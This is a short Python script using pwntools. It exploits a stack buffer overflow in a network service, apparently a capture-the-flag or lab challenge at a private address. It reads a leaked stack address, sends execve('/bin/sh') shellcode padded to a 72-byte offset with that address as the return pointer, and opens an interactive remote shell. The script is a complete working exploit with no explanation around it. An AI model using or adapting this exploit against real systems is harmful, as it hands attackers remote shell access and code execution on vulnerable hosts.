#!/usr/bin/python3
from pwn import remote, p64

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

offset = 72
junk = b"A" * (offset - len(shellcode))

shell = remote('10.13.37.10', 9999)
shell.recvuntil(b"Oops, I'm leaking! ")

ret = p64(int(shell.recvuntil(b"\n"),16))

payload = shellcode + junk + ret

shell.recvuntil(b"> ")
shell.sendline(payload)
shell.interactive()
